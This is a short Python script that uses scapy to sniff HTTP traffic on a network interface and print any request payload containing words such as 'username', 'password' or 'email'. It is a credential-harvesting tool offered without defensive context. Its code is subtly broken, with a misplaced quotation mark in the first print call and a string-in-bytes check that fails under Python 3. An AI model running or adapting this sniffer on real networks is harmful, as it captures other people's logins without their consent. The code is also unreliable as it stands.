import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="eth0")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request >> + packet[http.HTTPRequest].path")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            Keys = ["username", "password", "pass", "email"]
            for key in Keys:
                if key in load:
                    print("[+] Possible password/username >>" + load)
                    break

iface = get_interface()
sniff(iface)